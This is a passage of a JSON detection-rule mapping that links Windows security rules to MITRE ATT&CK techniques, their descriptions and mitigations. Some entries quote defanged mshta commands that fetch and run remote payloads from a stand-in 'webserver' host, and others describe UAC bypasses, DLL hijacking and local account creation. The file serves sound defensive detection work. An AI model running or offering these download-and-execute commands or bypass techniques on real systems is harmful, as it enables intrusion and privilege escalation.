            "Adversaries may execute their own malicious payloads by hijacking the search order used to load DLLs. Windows systems use a common method to look for required DLLs to load into a program.  Hijacking DLL loads may be for the purpose of establishing persistence as well as elevating privileges and/or evading restrictions on file execution.\n\nThere are many ways an adversary can hijack DLL loads. Adversaries may plant trojan dynamic-link library files (DLLs) in a directory that will be searched before the location of a legitimate library that will be requested by a program, causing Windows to load their malicious library when it is called for by the victim program. Adversaries may also perform DLL preloading, also called binary planting attacks,  by placing a malicious DLL with the same name as an ambiguously specified DLL in a location that Windows searches before the legitimate DLL. Often this location is the current working directory of the program. Remote DLL preloading attacks occur when a program sets its current directory to a remote location such as a Web share before loading a DLL. \n\nPhantom DLL hijacking is a specific type of DLL search order hijacking where adversaries target references to non-existent DLL files. They may be able to load their own malicious DLL by planting it with the correct name in the location of the missing module.\n\nAdversaries may also directly modify the search order via DLL redirection, which after being enabled (in the Registry and creation of a redirection file) may cause a program to load a different DLL.\n\nIf a search order-vulnerable program is configured to run at a higher privilege level, then the adversary-controlled DLL that is loaded will also be executed at the higher level. In this case, the technique could be used for privilege escalation from user to administrator or SYSTEM or from administrator to SYSTEM, depending on the program. Programs that fall victim to path hijacking may appear to behave normally because malicious DLLs may be configured to also load the legitimate DLLs they were meant to replace."
        ],
        "mitigation_strategies": [
            "Use application control where appropriate.",
            "Disallow loading of remote DLLs. This is included by default in Windows Server 2012+ and is available by patch for XP+ and Server 2003+.\n\nEnable Safe DLL Search Mode to force search for system DLLs in directories with greater restrictions (e.g. <code>%SYSTEMROOT%</code>)to be used before local directory DLLs (e.g. a user's home directory)\n\nThe Safe DLL Search Mode can be enabled via Group Policy at Computer Configuration > [Policies] > Administrative Templates > MSS (Legacy): MSS: (SafeDllSearchMode) Enable Safe DLL search mode. The associated Windows Registry key for this is located at <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\SafeDLLSearchMode</code>"
        ]
    },
    {
        "rule_id": 92037,
        "rule_description": "A net.exe connection to a remote resource was started by $(win.eventdata.parentImage)",
        "mitre_id": [
            "T1567"
        ],
        "possible_attacks": [
            "Exfiltration Over Web Service"
        ],
        "description": [
            "Adversaries may use an existing, legitimate external Web service to exfiltrate data rather than their primary command and control channel. Popular Web services acting as an exfiltration mechanism may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to compromise. Firewall rules may also already exist to permit traffic to these services.\n\nWeb service providers also commonly use SSL/TLS encryption, giving adversaries an added level of protection."
        ],
        "mitigation_strategies": [
            "Web proxies can be used to enforce an external network communication policy that prevents use of unauthorized external services."
        ]
    },
    {
        "rule_id": 92038,
        "rule_description": "A connection to cloud resource was started by $(win.eventdata.parentImage)",
        "mitre_id": [
            "T1102",
            "T1567.002"
        ],
        "possible_attacks": [
            "Web Service",
            "Exfiltration to Cloud Storage"
        ],
        "description": [
            "Adversaries may use an existing, legitimate external Web service as a means for relaying data to/from a compromised system. Popular websites, cloud services, and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google, Microsoft, or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection.\n\nUse of Web services may also protect back-end C2 infrastructure from discovery through malware binary analysis while also enabling operational resiliency (since this infrastructure may be dynamically changed).",
            "Adversaries may exfiltrate data to a cloud storage service rather than over their primary command and control channel. Cloud storage services allow for the storage, edit, and retrieval of data from a remote cloud storage server over the Internet.\n\nExamples of cloud storage services include Dropbox and Google Docs. Exfiltration to these cloud storage services can provide a significant amount of cover to the adversary if hosts within the network are already communicating with the service. "
        ],
        "mitigation_strategies": [
            "Web proxies can be used to enforce external network communication policy that prevents use of unauthorized external services.",
            "Web proxies can be used to enforce an external network communication policy that prevents use of unauthorized external services."
        ]
    },
    {
        "rule_id": 92039,
        "rule_description": "A net.exe account discovery command was initiated",
        "mitre_id": [
            "T1087"
        ],
        "possible_attacks": [
            "Account Discovery"
        ],
        "description": [
            "Adversaries may attempt to get a listing of valid accounts, usernames, or email addresses on a system or within a compromised environment. This information can help adversaries determine which accounts exist, which can aid in follow-on behavior such as brute-forcing, spear-phishing attacks, or account takeovers (e.g., [Valid Accounts](\n\nAdversaries may use several methods to enumerate accounts, including abuse of existing tools, built-in commands, and potential misconfigurations that leak account names and roles or permissions in the targeted environment.\n\nFor examples, cloud environments typically provide easily accessible interfaces to obtain user lists. On hosts, adversaries can use default [PowerShell]( and other command line functionality to identify accounts. Information about email addresses and accounts may also be extracted by searching an infected system\u2019s files."
        ],
        "mitigation_strategies": [
            "Manage the creation, modification, use, and permissions associated to user accounts."
        ]
    },
    {
        "rule_id": 92040,
        "rule_description": "$(win.eventdata.originalFileName) executed a user creation command",
        "mitre_id": [
            "T1136.001"
        ],
        "possible_attacks": [
            "Local Account"
        ],
        "description": [
            "Adversaries may create a local account to maintain access to victim systems. Local accounts are those configured by an organization for use by users, remote support, services, or for administration on a single system or service. \n\nFor example, with a sufficient level of access, the Windows <code>net user /add</code> command can be used to create a local account. On macOS systems the <code>dscl -create</code> command can be used to create a local account. Local accounts may also be added to network devices, often via common [Network Device CLI]( commands such as <code>username</code>, or to Kubernetes clusters using the `kubectl` utility.\n\nSuch accounts may be used to establish secondary credentialed access that do not require persistent remote access tools to be deployed on the system."
        ],
        "mitigation_strategies": [
            "Limit the number of accounts permitted to create other accounts. Limit the usage of local administrator accounts to be used for day-to-day operations that may expose them to potential adversaries."
        ]
    },
    {
        "rule_id": 92041,
        "rule_description": "Value added to registry key has Base64-like pattern",
        "mitre_id": [
            "T1027",
            "T1112"
        ],
        "possible_attacks": [
            "Obfuscated Files or Information",
            "Modify Registry"
        ],
        "description": [
            "Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit. This is common behavior that can be used across different platforms and the network to evade defenses. \n\nPayloads may be compressed, archived, or encrypted in order to avoid detection. These payloads may be used during Initial Access or later to mitigate detection. Sometimes a user's action may be required to open and [Deobfuscate/Decode Files or Information]( for [User Execution]( The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary.  Adversaries may also use compressed or archived scripts, such as JavaScript. \n\nPortions of files can also be encoded to hide the plain-text strings that would otherwise help defenders with discovery.  Payloads may also be split into separate, seemingly benign files that only reveal malicious functionality when reassembled. \n\nAdversaries may also abuse [Command Obfuscation]( to obscure commands executed from payloads or directly via [Command and Scripting Interpreter]( Environment variables, aliases, characters, and other platform/language specific semantics can be used to evade signature based detections and application control mechanisms.   ",
            "Adversaries may interact with the Windows Registry to hide configuration information within Registry keys, remove information as part of cleaning up, or as part of other techniques to aid in persistence and execution.\n\nAccess to specific areas of the Registry depends on account permissions, some requiring administrator-level access. The built-in Windows command-line utility [Reg]( may be used for local or remote Registry modification.  Other tools may also be used, such as a remote access tool, which may contain functionality to interact with the Registry through the Windows API.\n\nRegistry modifications may also include actions to hide keys, such as prepending key names with a null character, which will cause an error and/or be ignored when read via [Reg]( or other utilities using the Win32 API.  Adversaries may abuse these pseudo-hidden keys to conceal payloads/commands used to maintain persistence.  \n\nThe Registry of a remote system may be modified to aid in execution of files as part of lateral movement. It requires the remote Registry service to be running on the target system.  Often [Valid Accounts]( are required, along with access to the remote system's [SMB/Windows Admin Shares]( for RPC communication."
        ],
        "mitigation_strategies": [
            "Ensure that a finite amount of ingress points to a software deployment system exist with restricted access for those required to allow and enable newly deployed software.",
            "Ensure proper permissions are set for Registry hives to prevent users from modifying keys for system components that may lead to privilege escalation."
        ]
    },
    {
        "rule_id": 92043,
        "rule_description": "Netsh used to add firewall rule",
        "mitre_id": [
            "T1562.004"
        ],
        "possible_attacks": [
            "Disable or Modify System Firewall"
        ],
        "description": [
            "Adversaries may disable or modify system firewalls in order to bypass controls limiting network usage. Changes could be disabling the entire mechanism as well as adding, deleting, or modifying particular rules. This can be done numerous ways depending on the operating system, including via command-line, editing Windows Registry keys, and Windows Control Panel.\n\nModifying or disabling a system firewall may enable adversary C2 communications, lateral movement, and/or data exfiltration that would otherwise not be allowed. For example, adversaries may add a new firewall rule for a well-known protocol (such as RDP) using a non-traditional and potentially less securitized port (i.e. [Non-Standard Port](\n\nAdversaries may also modify host networking settings that indirectly manipulate system firewalls, such as interface bandwidth or network connection request thresholds. Settings related to enabling abuse of various [Remote Services]( may also indirectly modify firewall rules."
        ],
        "mitigation_strategies": [
            "Ensure proper user permissions are in place to prevent adversaries from disabling or modifying firewall settings."
        ]
    },
    {
        "rule_id": 92044,
        "rule_description": "Netsh used to add firewall rule referencing port 5900, usually used for VNC",
        "mitre_id": [
            "T1562.004"
        ],
        "possible_attacks": [
            "Disable or Modify System Firewall"
        ],
        "description": [
            "Adversaries may disable or modify system firewalls in order to bypass controls limiting network usage. Changes could be disabling the entire mechanism as well as adding, deleting, or modifying particular rules. This can be done numerous ways depending on the operating system, including via command-line, editing Windows Registry keys, and Windows Control Panel.\n\nModifying or disabling a system firewall may enable adversary C2 communications, lateral movement, and/or data exfiltration that would otherwise not be allowed. For example, adversaries may add a new firewall rule for a well-known protocol (such as RDP) using a non-traditional and potentially less securitized port (i.e. [Non-Standard Port](\n\nAdversaries may also modify host networking settings that indirectly manipulate system firewalls, such as interface bandwidth or network connection request thresholds. Settings related to enabling abuse of various [Remote Services]( may also indirectly modify firewall rules."
        ],
        "mitigation_strategies": [
            "Ensure proper user permissions are in place to prevent adversaries from disabling or modifying firewall settings."
        ]
    },
    {
        "rule_id": 92045,
        "rule_description": "Reg.exe modified registry using .reg file in suspicious location",
        "mitre_id": [
            "T1112"
        ],
        "possible_attacks": [
            "Modify Registry"
        ],
        "description": [
            "Adversaries may interact with the Windows Registry to hide configuration information within Registry keys, remove information as part of cleaning up, or as part of other techniques to aid in persistence and execution.\n\nAccess to specific areas of the Registry depends on account permissions, some requiring administrator-level access. The built-in Windows command-line utility [Reg]( may be used for local or remote Registry modification.  Other tools may also be used, such as a remote access tool, which may contain functionality to interact with the Registry through the Windows API.\n\nRegistry modifications may also include actions to hide keys, such as prepending key names with a null character, which will cause an error and/or be ignored when read via [Reg]( or other utilities using the Win32 API.  Adversaries may abuse these pseudo-hidden keys to conceal payloads/commands used to maintain persistence.  \n\nThe Registry of a remote system may be modified to aid in execution of files as part of lateral movement. It requires the remote Registry service to be running on the target system.  Often [Valid Accounts]( are required, along with access to the remote system's [SMB/Windows Admin Shares]( for RPC communication."
        ],
        "mitigation_strategies": [
            "Ensure proper permissions are set for Registry hives to prevent users from modifying keys for system components that may lead to privilege escalation."
        ]
    },
    {
        "rule_id": 92046,
        "rule_description": "Possible use of fodhelper.exe used to bypass UAC and execute of malicious software",
        "mitre_id": [
            "T1548.002"
        ],
        "possible_attacks": [
            "Bypass User Account Control"
        ],
        "description": [
            "Adversaries may bypass UAC mechanisms to elevate process privileges on system. Windows User Account Control (UAC) allows a program to elevate its privileges (tracked as integrity levels ranging from low to high) to perform a task under administrator-level permissions, possibly by prompting the user for confirmation. The impact to the user ranges from denying the operation under high enforcement to allowing the user to perform the action if they are in the local administrators group and click through the prompt or allowing them to enter an administrator password to complete the action.\n\nIf the UAC protection level of a computer is set to anything but the highest level, certain Windows programs can elevate privileges or execute some elevated [Component Object Model]( objects without prompting the user through the UAC notification box. An example of this is use of [Rundll32]( to load a specifically crafted DLL which loads an auto-elevated [Component Object Model]( object and performs a file operation in a protected directory which would typically require elevated access. Malicious software may also be injected into a trusted process to gain elevated privileges without prompting a user.\n\nMany methods have been discovered to bypass UAC. The Github readme page for UACME contains an extensive list of methods that have been discovered and implemented, but may not be a comprehensive list of bypasses. Additional bypass methods are regularly discovered and some used in the wild, such as:\n\n* <code>eventvwr.exe</code> can auto-elevate and execute a specified binary or script.\n\nAnother bypass is possible through some lateral movement techniques if credentials for an account with administrator privileges are known, since UAC is a single system security mechanism, and the privilege or integrity of a process running on one system will be unknown on remote systems and default to high integrity."
        ],
        "mitigation_strategies": [
            "Although UAC bypass techniques exist, it is still prudent to use the highest enforcement level for UAC when possible and mitigate bypass opportunities that exist with techniques such as [DLL Search Order Hijacking]("
        ]
    },
    {
        "rule_id": 92047,
        "rule_description": "Office application started mshta.exe",
        "mitre_id": [
            "T1218.005"
        ],
        "possible_attacks": [
            "Mshta"
        ],
        "description": [
            "Adversaries may abuse mshta.exe to proxy execution of malicious .hta files and Javascript or VBScript through a trusted Windows utility. There are several examples of different types of threats leveraging mshta.exe during initial compromise and for execution of code      \n\nMshta.exe is a utility that executes Microsoft HTML Applications (HTA) files.  HTAs are standalone applications that execute using the same models and technologies of Internet Explorer, but outside of the browser. \n\nFiles may be executed by mshta.exe through an inline script: <code>mshta vbscript:Close(Execute(\"GetObject(\"\"script:https[:]//webserver/payload[.]sct\"\")\"))</code>\n\nThey may also be executed directly from URLs: <code>mshta http[:]//webserver/payload[.]hta</code>\n\nMshta.exe can be used to bypass application control solutions that do not account for its potential use. Since mshta.exe executes outside of the Internet Explorer's security context, it also bypasses browser security settings. "
        ],
        "mitigation_strategies": [
            "Use application control configured to block execution of <code>mshta.exe</code> if it is not required for a given system or network to prevent potential misuse by adversaries. For example, in Windows 10 and Windows Server 2016 and above, Windows Defender Application Control (WDAC) policy rules may be applied to block the <code>mshta.exe</code> application and to prevent abuse."
        ]
    },
    {
        "rule_id": 92048,
        "rule_description": "Office application started mshta.exe and executed scripting command",
        "mitre_id": [
            "T1218.005",
            "T1059"
        ],
        "possible_attacks": [
            "Mshta",
            "Command and Scripting Interpreter"
        ],
        "description": [
            "Adversaries may abuse mshta.exe to proxy execution of malicious .hta files and Javascript or VBScript through a trusted Windows utility. There are several examples of different types of threats leveraging mshta.exe during initial compromise and for execution of code      \n\nMshta.exe is a utility that executes Microsoft HTML Applications (HTA) files.  HTAs are standalone applications that execute using the same models and technologies of Internet Explorer, but outside of the browser. \n\nFiles may be executed by mshta.exe through an inline script: <code>mshta vbscript:Close(Execute(\"GetObject(\"\"script:https[:]//webserver/payload[.]sct\"\")\"))</code>\n\nThey may also be executed directly from URLs: <code>mshta http[:]//webserver/payload[.]hta</code>\n\nMshta.exe can be used to bypass application control solutions that do not account for its potential use. Since mshta.exe executes outside of the Internet Explorer's security context, it also bypasses browser security settings. ",
            "Adversaries may abuse command and script interpreters to execute commands, scripts, or binaries. These interfaces and languages provide ways of interacting with computer systems and are a common feature across many different platforms. Most systems come with some built-in command-line interface and scripting capabilities, for example, macOS and Linux distributions include some flavor of [Unix Shell]( while Windows installations include the [Windows Command Shell]( and [PowerShell](\n\nThere are also cross-platform interpreters such as [Python]( as well as those commonly associated with client applications such as [JavaScript]( and [Visual Basic](\n\nAdversaries may abuse these technologies in various ways as a means of executing arbitrary commands. Commands and scripts can be embedded in [Initial Access]( payloads delivered to victims as lure documents or as secondary payloads downloaded from an existing C2. Adversaries may also execute commands through interactive terminals/shells, as well as utilize various [Remote Services]( in order to achieve remote Execution."
        ],
        "mitigation_strategies": [
            "Use application control configured to block execution of <code>mshta.exe</code> if it is not required for a given system or network to prevent potential misuse by adversaries. For example, in Windows 10 and Windows Server 2016 and above, Windows Defender Application Control (WDAC) policy rules may be applied to block the <code>mshta.exe</code> application and to prevent abuse.",
            "Script blocking extensions can help prevent the execution of scripts and HTA files that may commonly be used during the exploitation process. For malicious code served up through ads, adblockers can help prevent that code from executing in the first place."
        ]
    },
    {
        "rule_id": 92049,
        "rule_description": "Verclsid.exe may have been used to execute COM payload",
        "mitre_id": [
            "T1218.012"
        ],
        "possible_attacks": [
            "Verclsid"
        ],
        "description": [
            "Adversaries may abuse verclsid.exe to proxy execution of malicious code. Verclsid.exe is known as the Extension CLSID Verification Host and is responsible for verifying each shell extension before they are used by Windows Explorer or the Windows Shell.\n\nAdversaries may abuse verclsid.exe to execute malicious payloads. This may be achieved by running <code>verclsid.exe /S /C {CLSID}</code>, where the file is referenced by a Class ID (CLSID), a unique identification number used to identify COM objects. COM payloads executed by verclsid.exe may be able to perform various malicious actions, such as loading and executing COM scriptlets (SCT) from remote servers (similar to [Regsvr32]( Since the binary may be signed and/or native on Windows systems, proxying execution via verclsid.exe may bypass application control solutions that do not account for its potential abuse. "
        ],
        "mitigation_strategies": [
            "Consider modifying host firewall rules to prevent egress traffic from verclsid.exe."
        ]
    },
    {
        "rule_id": 92050,
        "rule_description": "Office application invoked Verclsid.exe, possible COM payload execution",
        "mitre_id": [
            "T1218.012",
            "T1559.001"
        ],
        "possible_attacks": [
            "Verclsid",
            "Component Object Model"
        ],
        "description": [
            "Adversaries may abuse verclsid.exe to proxy execution of malicious code. Verclsid.exe is known as the Extension CLSID Verification Host and is responsible for verifying each shell extension before they are used by Windows Explorer or the Windows Shell.\n\nAdversaries may abuse verclsid.exe to execute malicious payloads. This may be achieved by running <code>verclsid.exe /S /C {CLSID}</code>, where the file is referenced by a Class ID (CLSID), a unique identification number used to identify COM objects. COM payloads executed by verclsid.exe may be able to perform various malicious actions, such as loading and executing COM scriptlets (SCT) from remote servers (similar to [Regsvr32]( Since the binary may be signed and/or native on Windows systems, proxying execution via verclsid.exe may bypass application control solutions that do not account for its potential abuse. ",
            "Adversaries may use the Windows Component Object Model (COM) for local code execution. COM is an inter-process communication (IPC) component of the native Windows application programming interface (API) that enables interaction between software objects, or executable code that implements one or more interfaces. Through COM, a client object can call methods of server objects, which are typically binary Dynamic Link Libraries (DLL) or executables (EXE). Remote COM execution is facilitated by [Remote Services]( such as  [Distributed Component Object Model]( (DCOM).\n\nVarious COM interfaces are exposed that can be abused to invoke arbitrary execution via a variety of programming languages such as C, C++, Java, and [Visual Basic]( Specific COM objects also exist to directly perform functions beyond code execution, such as creating a [Scheduled Task/Job]( fileless download/execution, and other adversary behaviors related to privilege escalation and persistence."
        ],
        "mitigation_strategies": [
            "Consider modifying host firewall rules to prevent egress traffic from verclsid.exe.",
            "Modify Registry settings (directly or using Dcomcnfg.exe) in `HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\Classes\\\\AppID\\\\{AppID_GUID}` associated with the process-wide security of individual COM applications.\n\nModify Registry settings (directly or using Dcomcnfg.exe) in `HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\Microsoft\\\\Ole` associated with system-wide security defaults for all COM applications that do no set their own process-wide security. "
        ]
    },
    {
        "rule_id": 92051,
        "rule_description": "Executed a renamed copy of wscript.exe",
        "mitre_id": [
            "T1036.003",
            "T1059.005"
        ],
        "possible_attacks": [
            "Rename System Utilities",
            "Visual Basic"
        ],
        "description": [
            "Adversaries may rename legitimate system utilities to try to evade security mechanisms concerning the usage of those utilities. Security monitoring and control mechanisms may be in place for system utilities adversaries are capable of abusing.  It may be possible to bypass those security mechanisms by renaming the utility prior to utilization (ex: rename <code>rundll32.exe</code>).  An alternative case occurs when a legitimate utility is copied or moved to a different directory and renamed to avoid detections based on system utilities executing from non-standard paths. ",
            "Adversaries may abuse Visual Basic (VB) for execution. VB is a programming language created by Microsoft with interoperability with many Windows technologies such as [Component Object Model]( and the [Native API]( through the Windows API. Although tagged as legacy with no planned future evolutions, VB is integrated and supported in the .NET Framework and cross-platform .NET Core.\n\nDerivative languages based on VB have also been created, such as Visual Basic for Applications (VBA) and VBScript. VBA is an event-driven programming language built into Microsoft Office, as well as several third-party applications. VBA enables documents to contain macros used to automate the execution of tasks and other functionality on the host. VBScript is a default scripting language on Windows hosts and can also be used in place of [JavaScript]( on HTML Application (HTA) webpages served to Internet Explorer (though most modern browsers do not come with VBScript support).\n\nAdversaries may use VB payloads to execute malicious commands. Common malicious usage includes automating execution of behaviors with VBScript or embedding VBA content into [Spearphishing Attachment]( payloads (which may also involve [Mark-of-the-Web Bypass]( to enable execution)."
        ],
        "mitigation_strategies": [
            "Use file system access controls to protect folders such as C:\\Windows\\System32.",
            "Script blocking extensions can help prevent the execution of scripts and HTA files that may commonly be used during the exploitation process. For malicious code served up through ads, adblockers can help prevent that code from executing in the first place."
        ]
    },
    {
        "rule_id": 92052,
        "rule_description": "Windows command prompt started by an abnormal process",
        "mitre_id": [
            "T1059.003"
        ],
        "possible_attacks": [
            "Windows Command Shell"
        ],
        "description": [
            "Adversaries may abuse the Windows command shell for execution. The Windows command shell ([cmd]( is the primary command prompt on Windows systems. The Windows command prompt can be used to control almost any aspect of a system, with various permission levels required for different subsets of commands. The command prompt can be invoked remotely via [Remote Services]( such as [SSH](\n\nBatch files (ex: .bat or .cmd) also provide the shell with a list of sequential commands to run, as well as normal scripting operations such as conditionals and loops. Common uses of batch files include long or repetitive tasks, or the need to run the same set of commands on multiple systems.\n\nAdversaries may leverage [cmd]( to execute various commands and payloads. Common uses include [cmd]( to execute a single command, or abusing [cmd]( interactively with input and output forwarded over a command and control channel."
        ],
        "mitigation_strategies": [
            "Use application control where appropriate."
        ]
    },
    {
        "rule_id": 92053,
        "rule_description": "Detected a suspicious process launched with a jscript engine signature",
        "mitre_id": [
            "T1059.003"
        ],
        "possible_attacks": [
            "Windows Command Shell"
        ],
        "description": [
            "Adversaries may abuse the Windows command shell for execution. The Windows command shell ([cmd]( is the primary command prompt on Windows systems. The Windows command prompt can be used to control almost any aspect of a system, with various permission levels required for different subsets of commands. The command prompt can be invoked remotely via [Remote Services]( such as [SSH](\n\nBatch files (ex: .bat or .cmd) also provide the shell with a list of sequential commands to run, as well as normal scripting operations such as conditionals and loops. Common uses of batch files include long or repetitive tasks, or the need to run the same set of commands on multiple systems.\n\nAdversaries may leverage [cmd]( to execute various commands and payloads. Common uses include [cmd]( to execute a single command, or abusing [cmd]( interactively with input and output forwarded over a command and control channel."
        ],
        "mitigation_strategies": [
            "Use application control where appropriate."
        ]
    },
    {
        "rule_id": 92054,
        "rule_description": "Suspicious execution of .js file by $(win.eventdata.image)",
        "mitre_id": [
            "T1059.007"
        ],
        "possible_attacks": [
            "JavaScript"
        ],
        "description": [
            "Adversaries may abuse various implementations of JavaScript for execution. JavaScript (JS) is a platform-independent scripting language (compiled just-in-time at runtime) commonly associated with scripts in webpages, though JS can be executed in runtime environments outside the browser.\n\nJScript is the Microsoft implementation of the same scripting standard. JScript is interpreted via the Windows Script engine and thus integrated with many components of Windows such as the [Component Object Model]( and Internet Explorer HTML Application (HTA) pages.\n\nJavaScript for Automation (JXA) is a macOS scripting language based on JavaScript, included as part of Apple\u2019s Open Scripting Architecture (OSA), that was introduced in OSX 10.10. Apple\u2019s OSA provides scripting capabilities to control applications, interface with the operating system, and bridge access into the rest of Apple\u2019s internal APIs. As of OSX 10.10, OSA only supports two languages, JXA and [AppleScript]( Scripts can be executed via the command line utility <code>osascript</code>, they can be compiled into applications or script files via <code>osacompile</code>, and they can be compiled and executed in memory of other programs by leveraging the OSAKit Framework.\n\nAdversaries may abuse various implementations of JavaScript to execute various behaviors. Common uses include hosting malicious scripts on websites as part of a [Drive-by Compromise]( or downloading and executing these script files as secondary payloads. Since these payloads are text-based, it is also very common for adversaries to obfuscate their content as part of [Obfuscated Files or Information]("
        ],
        "mitigation_strategies": [
            "Script blocking extensions can help prevent the execution of JavaScript and HTA files that may commonly be used during the exploitation process. For malicious code served up through ads, adblockers can help prevent that code from executing in the first place."
        ]
    },
    {
        "rule_id": 92055,
        "rule_description": "Known auto-elevated utility $(win.eventdata.originalFileName) may have been used to bypass UAC",
        "mitre_id": [
            "T1548.002"
        ],
        "possible_attacks": [
            "Bypass User Account Control"
        ],
        "description": [
            "Adversaries may bypass UAC mechanisms to elevate process privileges on system. Windows User Account Control (UAC) allows a program to elevate its privileges (tracked as integrity levels ranging from low to high) to perform a task under administrator-level permissions, possibly by prompting the user for confirmation. The impact to the user ranges from denying the operation under high enforcement to allowing the user to perform the action if they are in the local administrators group and click through the prompt or allowing them to enter an administrator password to complete the action.\n\nIf the UAC protection level of a computer is set to anything but the highest level, certain Windows programs can elevate privileges or execute some elevated [Component Object Model]( objects without prompting the user through the UAC notification box. An example of this is use of [Rundll32]( to load a specifically crafted DLL which loads an auto-elevated [Component Object Model]( object and performs a file operation in a protected directory which would typically require elevated access. Malicious software may also be injected into a trusted process to gain elevated privileges without prompting a user.\n\nMany methods have been discovered to bypass UAC. The Github readme page for UACME contains an extensive list of methods that have been discovered and implemented, but may not be a comprehensive list of bypasses. Additional bypass methods are regularly discovered and some used in the wild, such as:\n\n* <code>eventvwr.exe</code> can auto-elevate and execute a specified binary or script.\n\nAnother bypass is possible through some lateral movement techniques if credentials for an account with administrator privileges are known, since UAC is a single system security mechanism, and the privilege or integrity of a process running on one system will be unknown on remote systems and default to high integrity."
        ],
        "mitigation_strategies": [
            "Although UAC bypass techniques exist, it is still prudent to use the highest enforcement level for UAC when possible and mitigate bypass opportunities that exist with techniques such as [DLL Search Order Hijacking]("
        ]
    },
    {
        "rule_id": 92056,
        "rule_description": "Powershell process invoked known auto-elevated utility $(win.eventdata.originalFileName), may have been used to bypass UAC",
        "mitre_id": [
            "T1548.002"
        ],
        "possible_attacks": [
            "Bypass User Account Control"
        ],
        "description": [
            "Adversaries may bypass UAC mechanisms to elevate process privileges on system. Windows User Account Control (UAC) allows a program to elevate its privileges (tracked as integrity levels ranging from low to high) to perform a task under administrator-level permissions, possibly by prompting the user for confirmation. The impact to the user ranges from denying the operation under high enforcement to allowing the user to perform the action if they are in the local administrators group and click through the prompt or allowing them to enter an administrator password to complete the action.\n\nIf the UAC protection level of a computer is set to anything but the highest level, certain Windows programs can elevate privileges or execute some elevated [Component Object Model]( objects without prompting the user through the UAC notification box. An example of this is use of [Rundll32]( to load a specifically crafted DLL which loads an auto-elevated [Component Object Model]( object and performs a file operation in a protected directory which would typically require elevated access. Malicious software may also be injected into a trusted process to gain elevated privileges without prompting a user.\n\nMany methods have been discovered to bypass UAC. The Github readme page for UACME contains an extensive list of methods that have been discovered and implemented, but may not be a comprehensive list of bypasses. Additional bypass methods are regularly discovered and some used in the wild, such as:\n\n* <code>eventvwr.exe</code> can auto-elevate and execute a specified binary or script.\n\nAnother bypass is possible through some lateral movement techniques if credentials for an account with administrator privileges are known, since UAC is a single system security mechanism, and the privilege or integrity of a process running on one system will be unknown on remote systems and default to high integrity."
        ],
        "mitigation_strategies": [
            "Although UAC bypass techniques exist, it is still prudent to use the highest enforcement level for UAC when possible and mitigate bypass opportunities that exist with techniques such as [DLL Search Order Hijacking]("
        ]
    },
    {
        "rule_id": 92057,
        "rule_description": "Powershell.exe spawned a powershell process which executed a base64 encoded command",
        "mitre_id": [
            "T1059.001"
        ],
        "possible_attacks": [
            "PowerShell"
        ],
        "description": [
            "Adversaries may abuse PowerShell commands and scripts for execution. PowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system. Adversaries can use PowerShell to perform a number of actions, including discovery of information and execution of code. Examples include the <code>Start-Process</code> cmdlet which can be used to run an executable and the <code>Invoke-Command</code> cmdlet which runs a command locally or on a remote computer (though administrator permissions are required to use PowerShell to connect to remote systems).\n\nPowerShell may also be used to download and run executables from the Internet, which can be executed from disk or in memory without touching disk.\n\nA number of PowerShell-based offensive testing tools are available, including [Empire](  [PowerSploit]( [PoshC2]( and PSAttack.\n\nPowerShell commands/scripts can also be executed without directly invoking the <code>powershell.exe</code> binary through interfaces to PowerShell's underlying <code>System.Management.Automation</code> assembly DLL exposed through the .NET framework and Windows Common Language Interface (CLI)."
        ],
        "mitigation_strategies": [
            "When PowerShell is necessary, consider restricting PowerShell execution policy to administrators. Be aware that there are methods of bypassing the PowerShell execution policy, depending on environment configuration.\n\nPowerShell JEA (Just Enough Administration) may also be used to sandbox administration and limit what commands admins/users can execute through remote PowerShell sessions."
        ]
    },
    {
        "rule_id": 92058,
        "rule_description": "Application Compatibility Database launched",
        "mitre_id": [
            "T1546.011"
        ],
        "possible_attacks": [
            "Application Shimming"
        ],
        "description": [
            "Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by application shims. The Microsoft Windows Application Compatibility Infrastructure/Framework (Application Shim) was created to allow for backward compatibility of software as the operating system codebase changes over time. For example, the application shimming feature allows developers to apply fixes to applications (without rewriting code) that were created for Windows XP so that it will work with Windows 10. \n\nWithin the framework, shims are created to act as a buffer between the program (or more specifically, the Import Address Table) and the Windows OS. When a program is executed, the shim cache is referenced to determine if the program requires the use of the shim database (.sdb). If so, the shim database uses hooking to redirect the code as necessary in order to communicate with the OS. \n\nA list of all shims currently installed by the default Windows installer (sdbinst.exe) is kept in:\n\n* <code>%WINDIR%\\AppPatch\\sysmain.sdb</code> and\n* <code>hklm\\software\\microsoft\\windows nt\\currentversion\\appcompatflags\\installedsdb</code>\n\nCustom databases are stored in:\n\n* <code>%WINDIR%\\AppPatch\\custom & %WINDIR%\\AppPatch\\AppPatch64\\Custom</code> and\n* <code>hklm\\software\\microsoft\\windows nt\\currentversion\\appcompatflags\\custom</code>\n\nTo keep shims secure, Windows designed them to run in user mode so they cannot modify the kernel and you must have administrator privileges to install a shim. However, certain shims can be used to [Bypass User Account Control]( (UAC and RedirectEXE), inject DLLs into processes (InjectDLL), disable Data Execution Prevention (DisableNX) and Structure Exception Handling (DisableSEH), and intercept memory addresses (GetProcAddress).\n\nUtilizing these shims may allow an adversary to perform several malicious acts such as elevate privileges, install backdoors, disable defenses like Windows Defender, etc.  Shims can also be abused to establish persistence by continuously being invoked by affected programs."
        ],
        "mitigation_strategies": [
            "Changing UAC settings to \"Always Notify\" will give the user more visibility when UAC elevation is requested, however, this option will not be popular among users due to the constant UAC interruptions."
        ]
    },
    {
        "rule_id": 92059,
        "rule_description": "Possible Shimming. Application Compatibility Database launched from an encoded powershell command",
        "mitre_id": [
            "T1059.001",
            "T1546.011"
        ],
        "possible_attacks": [
            "PowerShell",
            "Application Shimming"
        ],
        "description": [
